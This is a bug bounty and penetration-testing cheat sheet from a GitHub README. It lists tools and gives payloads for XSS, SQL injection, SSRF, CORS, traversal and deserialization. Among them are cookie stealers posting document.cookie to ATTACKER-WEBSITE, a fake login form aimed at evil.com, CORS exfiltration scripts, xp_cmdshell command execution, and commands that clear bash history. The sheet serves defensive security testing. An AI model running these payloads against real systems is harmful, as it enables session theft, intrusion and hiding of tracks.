# EasyG

EasyG started out as a script that I use to automate some information gathering tasks for PenTesting and Bug Hunting, [you can find it here](https://github.com/seeu-inspace/easyg/blob/main/easyg.rb). Now it's more than that.

Here I gather all the resources about PenTesting and Bug Bounty Hunting that I find interesting: notes, payloads that I found useful and many links to blogs and articles.

### Index

- [Blog / Writeups / News & more](#blog--writeups--news--more)
- [Safety tips](#safety-tips)
- [Tools](#tools)
- [Bash](#bash)
- [XSS](#xss)
- [SQLi](#sqli)
- [Open Redirect](#open-redirect)
- [SSRF](#ssrf)
- [Authentication vulnerabilities](#authentication-vulnerabilities)
- [Access control vulnerabilities and privilege escalation](#access-control-vulnerabilities-and-privilege-escalation)
- [Directory Traversal](#directory-traversal)
- [Business logic vulnerabilities](#business-logic-vulnerabilities)
- [CORS](#cors)
- [Deserialization](#deserialization)
- [DLL Hijacking](#dll-hijacking)
- [GraphQL](#graphql)
- [WordPress](#wordpress)
- [IIS - Internet Information Services](#iis---internet-information-services)
- [Network](#network)
- [Linux](#linux)

### Blog / Writeups / News & more

- https://pentester.land/list-of-bug-bounty-writeups.html
- https://hackerone.com/hacktivity
- https://portswigger.net/research
- https://www.skeletonscribe.net
- https://cvetrends.com/
- https://thehackernews.com/
- https://wiki.owasp.org/index.php/Testing_Checklist
- https://packetstormsecurity.com/
- https://github.com/OlivierLaflamme/Cheatsheet-God
- https://twitter.com/hashtag/bugbountytips
- https://securib.ee/
- https://samcurry.net/
- https://blog.intigriti.com/hackademy/xss-challenges/
- https://breached.to/
- https://github.com/juliocesarfort/public-pentesting-reports

### Safety tips

- For RCE 
  - Never upload a shell at first, you can be banned from a program. Just execute a `whoami` as a PoC, proceed with a shell if required/allowed.
- For stored XSS
  - `console.log()` is better than `alert()`, it makes less noise especially for stored XSS.
- For SQLi
  - Don't dump the entire db, you can be banned from a program. Just retrieve the db's name, version and/or other minor infos. Proceed with db dump only if required/allowed;
  - Don't use tautologies like `OR 1=1`, it can end up in a delete query or something dangerous. It's better to use `AND SLEEP(5)` or `te'+'st`.
- For subdomain takeovers
  - use as a PoC an html page like:<br/>
    9a69e2677c39cdae365b49beeac8e059.html
    ```HTML
    <!-- PoC by seeu -->
    ```

### Tools

- [XAMPP](https://www.apachefriends.org/) + [ngrok](https://ngrok.com/) || [beeceptor](https://beeceptor.com/) For a temporary public server
- [xsscrapy](https://github.com/DanMcInerney/xsscrapy)
- [LinkFinder](https://github.com/GerbenJavado/LinkFinder) To find links inside `.js`
- [XSS Hunter](https://xsshunter.com/) for blind XSS
- [textverified.com](https://www.textverified.com/) for auths requiring a phone number
- [nuclei](https://github.com/projectdiscovery/nuclei)
  - Check for Exposed panels `nuclei -l list.txt -t %USERPROFILE%/nuclei-templates/exposed-panels`
  - Check for Technologies `nuclei -l list.txt -t %USERPROFILE%/nuclei-templates/technologies`
  - Check for takeovers `nuclei -l list.txt -t %USERPROFILE%/nuclei-templates/takeovers`
  - Check for CVEs `nuclei -l list.txt -t %USERPROFILE%/nuclei-templates/cves`
  - Check for .git exposure `nuclei -l list.txt -t %USERPROFILE%\nuclei-templates\exposures\configs\git-config.yaml`
- [URL Decoder/Encoder](https://meyerweb.com/eric/tools/dencoder/)
- [Down or not](https://www.websiteplanet.com/webtools/down-or-not/)
- [DotGit](https://github.com/davtur19/DotGit) find if a website has `.git` exposed
- [CSRF PoC Generator](https://security.love/CSRF-PoC-Genorator/)
- [bgp.he.net](https://bgp.he.net/) to find ASN + `amass intel -asn <ASN>`
- [BruteSpray](https://github.com/x90skysn3k/brutespray) `python brutespray.py --file nmap.xml --threads 5 --hosts 5`
- [shuffledns](https://github.com/projectdiscovery/shuffledns)
- [all.txt by jhaddix](https://gist.githubusercontent.com/jhaddix/f64c97d0863a78454e44c2f7119c2a6a/raw/96f4e51d96b2203f19f6381c8c545b278eaa0837/all.txt)
- [SubOver](https://github.com/Ice3man543/SubOver) check for subdomain takeover `subover -l subdomains.txt`
- [Can I take over XYZ?](https://github.com/EdOverflow/can-i-take-over-xyz)
- [Arjun](https://github.com/s0md3v/Arjun) detection of the parameters present in the application
- [GitHack](https://github.com/captain-noob/GitHack) `python GitHack.py http://www.openssl.org/.git/` || [GitDumper from GitTools](https://github.com/internetwache/GitTools)
- [Tplmap](https://github.com/epinna/tplmap) for SSTI exploitation
- [PlexTrac](https://plextrac.com/) for reporting
- [Wappalyzer](https://www.wappalyzer.com/)
- [Webanalyze](https://github.com/rverton/webanalyze) Port of Wappalyzer for command line
- [DigitalOcean](https://www.digitalocean.com/) See [Setting Up Your Ubuntu Box for Pentest and Bug Bounty Automation](https://www.youtube.com/watch?v=YhUiAH5SIqk)

Used in [easyg.rb](https://github.com/seeu-inspace/easyg/blob/main/easyg.rb)
- [nmap](https://nmap.org/)
- [amass](https://github.com/OWASP/Amass)
- [subfinder](https://github.com/projectdiscovery/subfinder)
- [github-subdomains.py](https://github.com/gwen001/github-search/blob/master/github-subdomains.py)
- [gau](https://github.com/lc/gau)
- [httprobe](https://github.com/tomnomnom/httprobe)
- [anew](https://github.com/tomnomnom/anew)
- [gospider](https://github.com/jaeles-project/gospider)
- [hakrawler](https://github.com/hakluke/hakrawler)
- [ParamSpider](https://github.com/devanshbatham/ParamSpider)
- [Selenium](https://github.com/SeleniumHQ/selenium/wiki/Ruby-Bindings) to take webscreenshots
- [trashcompactor](https://github.com/michael1026/trashcompactor)

**Desktop Application Penetration Testing**
- [testssl.sh](https://testssl.sh/) useful for checking outdated ciphers & co.
- [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) to see which DLLs are missing for an exe and do DLL Hijacking
- [Process Hacker](https://processhacker.sourceforge.io/) It helps to dump the exe memory and see what sensitive data is there
- [VB Decompiler](https://www.vb-decompiler.org/products.htm) decompile an exe written in VB
- [Sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck) check the signature of an executable
- [ILSpy](https://github.com/icsharpcode/ILSpy) .NET decompiler
- [Echo Mirage](https://resources.infosecinstitute.com/topic/echo-mirage-walkthrough/) to monitor the network interactions of an application

**Android**

- [apktool](https://ibotpeaches.github.io/Apktool/) to unpack an apk
- [adb](https://developer.android.com/studio/command-line/adb) it is used to debug an android device
- [HTTP Toolkit](https://httptoolkit.tech/) to see requests on a non-rooted or emulated device, as an alternative to burp suite
- [Android Studio](https://developer.android.com/studio) Android application development, useful for the emulator
  - Note: To start the emulator only, use commands such as
    ```
    cd C:\Users\Riccardo\AppData\Local\Android\Sdk\emulator
    emulator -avd Pixel_4_XL_API_30
    ```
- [dex2jar](https://github.com/pxb1988/dex2jar) decompile an .apk into .jar + [jd-gui](https://java-decompiler.github.io/) to see the source of a .jar
- [jadx-gui](https://github.com/skylot/jadx/releases) another solution to explore the source code of an .apk

#### Burp suite

To add a domain + subdomains in advanced scopes: `^(.*\.)?test\.com$`

To modify User-Agent:
```
Type: Request header
Match: ^User-Agent: (.*)$
Replace: User-Agent: $1 stuff-here
Comment: stuff-here
[x] Regex match
```

To add custom header
```
Type: Request header
Match:
Replace: X-Bug-Bounty: stuff-here
Comment: stuff-here
[ ] Regex match
```

Cool extensions:
- [Autorize](https://github.com/PortSwigger/autorize)
- [InQL](https://github.com/doyensec/inql)
- [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder)
- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [BurpJSLinkFinder](https://github.com/InitRoot/BurpJSLinkFinder)
- [Wsdler](https://github.com/NetSPI/Wsdler) to interact with SOAP
- [BurpCustomizer](https://github.com/CoreyD97/BurpCustomizer)

### Bash

Read a file line by line with a script like `./bash.sh filename`
```bash
file=$1
while read -r line; do
    echo -e "$line"
done <$file 
```

### XSS

**Bypasses**
- https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)
- [JSFuck](http://www.jsfuck.com/)
- [Path Relative style sheet injection](https://portswigger.net/kb/issues/00200328_path-relative-style-sheet-import)
- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Shortest rXSS possible](https://brutelogic.com.br/blog/shortest-reflected-xss-possible/)
- [AwesomeXSS](https://github.com/s0md3v/AwesomeXSS)
- CSP evaluator [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com/)
- If Privileges are required, see if you can chain the XSS with a CSRF
- [For hidden inputs](https://portswigger.net/research/xss-in-hidden-input-fields): `accesskey="X" onclick="alert(1)"` then Press ALT+SHIFT+X on Windows / CTRL+ALT+X on OS X
- For **mobile applications**: try use as a vector the name of the phone with a payload like `"/><script>alert(1)</script>`
- For **desktop applications**: try use as a vector the SSID with a payload like `"/><img src=x onerror=alert(1)>`

**Swagger XSS**
- https://github.com/swagger-api/swagger-ui/issues/3847
- https://github.com/swagger-api/swagger-ui/issues/1262

**Cross Site Tracing**

If cookies are protected by the HttpOnly flag but the TRACE method is enabled, a technique called Cross Site Tracing can be used. Reference: https://owasp.org/www-community/attacks/Cross_Site_Tracing

**Payloads**
- HTML inj 
  ```HTML
  <p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a><br/><img src=http://evil.com style="visibility:hidden">
  ```
- iframe + base64 encoded SVG 
  ```HTML
  <iframe src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pgo8IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPgoKPHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogICA8cmVjdCB3aWR0aD0iMzAwIiBoZWlnaHQ9IjEwMCIgc3R5bGU9ImZpbGw6cmdiKDAsMCwyNTUpO3N0cm9rZS13aWR0aDozO3N0cm9rZTpyZ2IoMCwwLDApIiAvPgogICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CiAgICAgIGFsZXJ0KGRvY3VtZW50LmRvbWFpbik7CiAgICAgIGFsZXJ0KGRvY3VtZW50LmNvb2tpZSk7CiAgIDwvc2NyaXB0Pgo8L3N2Zz4="></iframe>
  ```
- Cookie stealers
  - ```JavaScript
    fetch('https://ATTACKER-WEBSITE', {method: 'POST',mode: 'no-cors',body:document.cookie});
    ```
  - ```JavaScript
    document.write('<img src=\"http://ATTACKER-WEBSITE/?cookie=' + document.cookie + '\" />')
    ```
  - ```HTML
    <img src=x onerror=this.src='http://ATTACKER-WEBSITE/?'+document.cookie;>
    ```

### SQLi

- [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

```
 > SQLMap: sqlmap -u https://vulnerable/index.php?id=1
                  --tables (to see db)
                  -D DATABASE_NAME -T TABLE_NAME --dump (to see data)
                  --forms --batch --crawl=10 --random-agent --level=5 --risk=3 (to crawl)
```

**RCE**
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
xp_cmdshell 'COMMAND';
```

```
EXEC sp_configure 'allow updates', 0
RECONFIGURE
EXEC sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXEC sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
xp_cmdshell 'COMMAND';
```

### Open Redirect

Bypass:
- https://subdomain.victim.com/r/redir?url=https%3A%2F%2Fvictim.com%40ATTACKER_WEBSITE.COM?x=subdomain.victim.com%2f

### SSRF

SSRF with blacklist-based input filters bypass: Some applications block input containing hostnames like `127.0.0.1` and localhost, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using various techniques:
- Using an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`;
- Registering your own domain name that resolves to `127.0.0.1`. You can use spoofed.burpcollaborator.net for this purpose;
- Obfuscating blocked strings using URL encoding or case variation.

SRF with whitelist-based input filters bypass
- You can embed credentials in a URL before the hostname, using the `@` character. For example: `https://expected-host@evil-host`.
- You can use the `#` character to indicate a URL fragment. For example: `https://evil-host#expected-host`.
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: `https://expected-host.evil-host`.
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
- You can use combinations of these techniques together.

By combining it with an open redirect, you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`

For AWS, bypass some restrictions by hosting this PHP page ([Reference](https://hackerone.com/reports/508459)):
```PHP
<?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
```

If needed, the domain `firefox.fr` is a DNS that point to `127.0.0.1`.

### Authentication vulnerabilities

Common Spots:
- Vulnerabilities in password-based login
- Vulnerabilities in multi-factor authentication
  - Two-factor authentication
  - Bypass
  - Bruteforce
- [Keeping users logged in](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
- [Password reset](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)
- [Password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)

### Access control vulnerabilities and privilege escalation

In the context of web applications, access control is dependent on authentication and session management:
- Authentication identifies the user and confirms that they are who they say they are;
- Session management identifies which subsequent HTTP requests are being made by that same user;
- Access control determines whether the user is allowed to carry out the action that they are attempting to perform.

From a user perspective, access controls can be divided into the following categories:
- Vertical access controls
  Mechanisms that restrict access to sensitive functionality that is not available to other types of users
- Horizontal access controls
  Mechanisms that restrict access to resources to the users who are specifically allowed to access those resources
- Context-dependent access controls
  Restrict access to functionality and resources based upon the state of the application or the user's interaction with it

### Directory Traversal

- simple case `https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`
- absolute path `https://insecure-website.com/loadImage?filename=/etc/passwd`
- stripped non-recursively `https://insecure-website.com/loadImage?filename=....//....//....//etc/passwd`
- superfluous URL-decode `https://insecure-website.com/loadImage?filename=..%252f..%252f..%252fetc/passwd`
- validation of start of path `https://insecure-website.com/loadImage?filename=/var/www/images/../../../etc/passwd`
- validation of start of path `https://insecure-website.com/loadImage?filename=../../../etc/passwd%00.png`

### Business logic vulnerabilities

Examples:
- Excessive trust in client-side controls
- 2FA broken logic
- Failing to handle unconventional input
- Inconsistent security controls
- Weak isolation on dual-use endpoint
- Password reset broken logic
- Insufficient workflow validation
- Flawed enforcement of business rules
- [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)

### CORS

Classic CORS vulnerability
```HTML
<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','$url/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
  location='/log?key='+this.responseText;
  };
</script>
```

CORS vulnerability with null origin
```HTML
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','vulnerable-website.com/sensitive-victim-data',true);
  req.withCredentials = true;
  req.send();
     
  function reqListener() {
  location='malicious-website.com/log?key='+this.responseText;
  };</script>">
</iframe>
```

CORS vulnerability with trusted insecure protocols
```HTML
<script>
  document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

### Deserialization

**Ysoserial**

Because of `Runtime.exec()`, ysoserial doesn't work well with multiple commands. After some research, I found a way to run multiple sys commands anyway, by using `sh -c $@|sh . echo ` before the multiple commands that we need to run. Here I needed to run the command `host` and `whoami`:

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . echo host $(whoami).<MY-'RATOR-ID>.burpcollaborator.net' | gzip | base64
```

[PHPGGC](https://github.com/ambionics/phpggc) is a library of unserialize() payloads along with a tool to generate them, from command line or programmatically.

### DLL Hijacking

Using Process Monitor (you can find it in the section [Tools](#tools)) set the filters to find missing dlls.<br/><br/>
  <img src="https://raw.githubusercontent.com/seeu-inspace/easyg/main/img/procmon-config.png" alt="procmon-config">

After that, insert the dll in the position of the missing ones with the same name. An example of a dll:

```c++
#include <windows.h>

BOOL WINAPI DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        MessageBox(NULL,
            "success!!",
            "pwned",
            MB_ICONERROR | MB_OK
        );
        break;
    }

    return TRUE;
}
```

**Resources**
- [hijacklibs.net](https://hijacklibs.net/)
- [Save the Environment (Variable)](https://www.wietzebeukema.nl/blog/save-the-environment-variables)

### GraphQL

To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangoncharov.github.io/graphql-voyager/) or [InQL](https://github.com/doyensec/inql) for Burp Suite.

**GraphQL Introspection query**

```
{"query": "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
```

```
{query: __schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
```

```
{"operationName":"IntrospectionQuery","variables":{},"query":"query IntrospectionQuery {\n  __schema {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n    types {\n      ...FullType\n    }\n    directives {\n      name\n      description\n      locations\n      args {\n        ...InputValue\n      }\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  description\n  fields(includeDeprecated: true) {\n    name\n    description\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n    isDeprecated\n    deprecationReason\n  }\n  inputFields {\n    ...InputValue\n  }\n  interfaces {\n    ...TypeRef\n  }\n  enumValues(includeDeprecated: true) {\n    name\n    description\n    isDeprecated\n    deprecationReason\n  }\n  possibleTypes {\n    ...TypeRef\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  description\n  type {\n    ...TypeRef\n  }\n  defaultValue\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n            ofType {\n              kind\n              name\n              ofType {\n                kind\n                name\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n"}
```

### WordPress

- Data exposure:
  - `/wp-json/wp/v2/users/`
  - `/wp-json/th/v1/user_generation`
  - `/?rest_route=/wp/v2/users`
- xmlrpc.php enabled, [reference](https://hackerone.com/reports/138869). Send a post request to this endpoint with a body like this:
  ```xml
  <?xml version="1.0" encoding="utf-8"?>
  <methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
  </methodCall>
  ```
- Use [Nuclei](https://github.com/projectdiscovery/nuclei) to detect WordPress websites from a list of targets with: `nuclei -l subdomains.txt -t %USERPROFILE%/nuclei-templates/technologies/wordpress-detect.yaml`
- Scan with WPScan [github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan) with: `wpscan --url <domain> --api-token <your-api-token>`

More here: https://github.com/daffainfo/AllAboutBugBounty/blob/master/Technologies/WordPress.md

https://www.rcesecurity.com/2022/07/WordPress-Transposh-Exploiting-a-Blind-SQL-Injection-via-XSS/

### IIS - Internet Information Services

- Wordlist [iisfinal.txt](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#iis-discovery-bruteforce)
- Check if `trace.axd` is enabled
- [Other common files](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services#common-files)
- Search for
  ```
  Views/web.config
  bin/WebApplication1.dll
  System.Web.Mvc.dll
  System.Web.Mvc.Ajax.dll
  System.Web.Mvc.Html.dll
  System.Web.Optimization.dll
  System.Web.Routing.dll
  ```

Reference: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services

### Network
```
ip route add <net_address_in_cdr> via <interface_gateway>
route add <net_address_in_cdr> mask <net_address_mask_in_cdr> <interface_gateway> (Windows)
nmap -sn <net_address_in_cdr> | Check hosts alive, adding -A you gather more info for a target
```

### Linux

**Linux Commands**
```
netstat -tulpn                                        Show Linux network ports with process ID’s (PIDs)
watch ss -stplu                                       Watch TCP, UDP open ports in real time with socket summary.
lsof -i                                               Show established connections.
macchanger -m MACADDR INTR                            Change MAC address on KALI Linux.
ifconfig eth0 192.168.2.1/24                          Set IP address in Linux.
ifconfig eth0:1 192.168.2.3/24                        Add IP address to existing network interface in Linux.
ifconfig eth0 hw ether MACADDR                        Change MAC address in Linux using ifconfig.
ifconfig eth0 mtu 1500                                Change MTU size Linux using ifconfig, change 1500 to your desired MTU.
dig -x 192.168.1.1                                    Dig reverse lookup on an IP address.
host 192.168.1.1                                      Reverse lookup on an IP address, in case dig is not installed.
dig @192.168.2.2 domain.com -t AXFR                   Perform a DNS zone transfer using dig.
host -l domain.com nameserver                         Perform a DNS zone transfer using host.
nbtstat -A x.x.x.x                                    Get hostname for IP address.
ip addr add 192.168.2.22/24 dev eth0                  Adds a hidden IP address to Linux, does not show up when performing an ifconfig.
tcpkill -9 host google.com                            Blocks access to google.com from the host machine.
echo \"1\" > /proc/sys/net/ipv4/ip_forward              Enables IP forwarding, turns Linux box into a router – handy for routing traffic through a box.
echo \"8.8.8.8\" > /etc/resolv.conf                     Use Google DNS.  
```

**Linux User Management**
```
whoami                                                Shows currently logged in user on Linux.
id                                                    Shows currently logged in user and groups for the user.
last                                                  Shows last logged in users.
mount                                                 Show mounted drives.
df -h                                                 Shows disk usage in human readable output.
echo \"user:passwd\" | chpasswd                         Reset password in one line.
getent passwd                                         List users on Linux.
strings /usr/local/bin/blah                           Shows contents of none text files, e.g. whats in a binary.
uname -ar                                             Shows running kernel version.
PATH=$PATH:/my/new-path                               Add a new PATH, handy for local FS manipulation.
history                                               Show bash history, commands the user has entered previously.
```

**Linux File Commands**
```
df -h blah                                            Display size of file / dir Linux.
diff file1 file2                                      Compare / Show differences between two files on Linux.
md5sum file                                           Generate MD5SUM Linux.
md5sum -c blah.iso.md5                                Check file against MD5SUM on Linux, assuming both file and .md5 are in the same dir.
file blah                                             Find out the type of file on Linux, also displays if file is 32 or 64 bit.
dos2unix                                              Convert Windows line endings to Unix / Linux.
base64 < input-file > output-file                     Base64 encodes input file and outputs a Base64 encoded file called output-file.
base64 -d < input-file > output-file                  Base64 decodes input file and outputs a Base64 decoded file called output-file.
touch -r ref-file new-file                            Creates a new file using the timestamp data from the reference file, drop the -r to simply create a file.
rm -rf                                                Remove files and directories without prompting for confirmation.
```

**Misc Commands**
```
init 6                                                Reboot Linux from the command line.
gcc -o output.c input.c                               Compile C code.
gcc -m32 -o output.c input.c                          Cross compile C code, compile 32 bit binary on 64 bit Linux.
unset HISTORYFILE                                     Disable bash history logging.
rdesktop X.X.X.X                                      Connect to RDP server from Linux.
kill -9 $$                                            Kill current session.
chown user:group blah                                 Change owner of file or dir.
chown -R user:group blah                              Change owner of file or dir and all underlying files / dirs – recersive chown.
chmod 600 file                                        Change file / dir permissions, see [Linux File System Permissons](#linux-file-system-permissions) for details.
ssh user@X.X.X.X | cat /dev/null > ~/.bash_history    Clear bash history
```

**Linux File System Permissions**
```
777 rwxrwxrwx                                         No restriction, global WRX any user can do anything.
755 rwxr-xr-x                                         Owner has full access, others can read and execute the file.
700 rwx------                                         Owner has full access, no one else has access.
666 rw-rw-rw-                                         All users can read and write but not execute.
644 rw-r--r--                                         Owner can read and write, everyone else can read.
600 rw-------                                         Owner can read and write, everyone else has no access.
```

**Linux Directories**
```
/                                                     / also know as “slash” or the root.
/bin                                                  Common programs, shared by the system, the system administrator and the users.
/boot                                                 Boot files, boot loader (grub), kernels, vmlinuz
/dev                                                  Contains references to system devices, files with special properties.
/etc                                                  Important system config files.
/home                                                 Home directories for system users.
/lib                                                  Library files, includes files for all kinds of programs needed by the system and the users.
/lost+found                                           Files that were saved during failures are here.
/mnt                                                  Standard mount point for external file systems.
/media                                                Mount point for external file systems (on some distros).
/net                                                  Standard mount point for entire remote file systems – nfs.
/opt                                                  Typically contains extra and third party software.
/proc                                                 A virtual file system containing information about system resources.
/root                                                 root users home dir.
/sbin                                                 Programs for use by the system and the system administrator.
/tmp                                                  Temporary space for use by the system, cleaned upon reboot.
/usr                                                  Programs, libraries, documentation etc. for all user-related programs.
/var                                                  Storage for all variable files and temporary files created by users, such as log files, mail queue,
                                                      print spooler. Web servers, Databases etc.
```

**Linux Interesting Files / Directories**
```
/etc/passwd                                           Contains local Linux users.
/etc/shadow                                           Contains local account password hashes.
/etc/group                                            Contains local account groups.
/etc/init.d/                                          Contains service init script – worth a look to see whats installed.
/etc/hostname                                         System hostname.
/etc/network/interfaces                               Network interfaces.
/etc/resolv.conf                                      System DNS servers.
/etc/profile                                          System environment variables.
~/.ssh/                                               SSH keys.
~/.bash_history                                       Users bash history log.
/var/log/                                             Linux system log files are typically stored here.
/var/adm/                                             UNIX system log files are typically stored here.
/var/log/apache2/access.log                           Apache access log file typical path.
/var/log/httpd/access.log                             Apache access log file typical path.
/etc/fstab                                            File system mounts.
```
